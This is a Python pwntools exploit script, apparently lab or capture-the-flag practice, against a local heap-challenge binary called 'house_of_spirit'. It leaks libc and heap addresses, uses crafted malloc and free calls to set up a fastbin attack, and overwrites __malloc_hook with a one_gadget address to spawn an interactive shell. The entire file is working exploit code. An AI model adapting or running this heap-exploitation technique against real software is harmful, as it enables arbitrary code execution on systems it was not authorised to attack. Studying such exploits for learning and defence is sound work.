#!/usr/bin/python
from pwn import *

def malloc(p, size, data, name):
    p.sendafter('>', b'1')
    p.sendafter('size:', size)
    p.sendafter('data:', data)
    p.sendafter('name:', name)

def free(p, index):
    p.sendafter('>', b'2')
    p.sendafter('index:', index)

def exploit(p):
    ''''''
    libc = ELF('../.glibc/glibc_2.30_no-tcache/libc.so.6')

    p.recvuntil('@')
    data = p.recvline().split(b' ')[1].strip()
    puts = int(data, 16) 
    libc.address = puts - 0x6faf0
    print(f'libc: {hex(libc.address)}')

    heap = int(p.recvline().split(b'@')[1].strip(), 16)
    print(f'heap base: {hex(heap)}')
     
    p.sendafter('age:', b'11')
    p.sendafter('username:', b'AAAAAA')
    malloc(p, b'100', b'A'*8, b'B'*8)
    malloc(p, b'100', b'C'*8, b'D'*8)
    malloc(p, b'100', b'E'*8, b'\0'*8 + p64(heap+0x10))
    free(p, b'0')
    free(p, b'1')
    free(p, b'2')
    malloc(p, b'100', p64(libc.symbols['__malloc_hook']-0x23), b'G'*8)
    malloc(p, b'100', b'H'*8, b'I'*8)
    malloc(p, b'100', b'K', b'L'*8)
    malloc(p, b'100', b'A'*19 + p64(libc.address + 0xe1fa1), b'M'*8)

#p = gdb.debug('./house_of_spirit', '''
#c            
#''')
p = process('./house_of_spirit')

exploit(p)

p.interactive()